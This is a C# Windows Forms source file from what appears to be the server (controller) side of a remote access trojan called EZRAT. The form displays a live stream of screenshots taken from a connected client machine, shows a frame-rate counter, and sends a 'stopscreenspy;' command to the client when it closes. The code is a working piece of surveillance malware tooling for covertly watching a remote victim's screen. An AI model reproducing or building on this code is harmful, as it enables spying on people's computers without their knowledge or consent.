using System;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using EZRATServer.Utils;

namespace EZRATServer.Forms
{
    public partial class ScreenShotViewer : Form
    {
        private Image _img;
        private Stopwatch sw = new Stopwatch();
        private bool _isUpdate = true;
        private uint _count = 0;
        private Server _parent;
        public Image Img
        {
            get => _img;

            set
            {
                try
                {
                    this._img = value;
                    this.pib.Invoke(new MethodInvoker(() => { this.pib.Image = Img; this.pib.Update(); }));
                    _count += 1;
                    this.StatusUpdate();
                }
                catch (Exception _)
                {
                    // Windows close
                }
            }
        }


        public ScreenShotViewer(Image img, Server parent)
        {
            InitializeComponent();
            this._parent = parent;
            sw.Start();
            this.pib.Image = img;
            this.FormClosing += (_, __) => { this._parent.SendCommand("stopscreenspy;", this._parent.GetIdClient());this._parent.OnOffscreenSpy = false; };
        }

        private void StatusUpdate()
        {
            if (sw.ElapsedMilliseconds >= 1000)
            {
                sw.Restart();
                this.lblStatus.Text = $"FPS : {_count}";
                _count = 0;
            }
        }

        public void UpdatePib(Image img)
        {
            Thread T = new Thread(() =>
            {
                this.pib.Invoke(new MethodInvoker(() => { this.pib.Image = this.Img; }));
                this.pib.Update();
            });
            T.Start();
            T.Join();
        }
    }
}
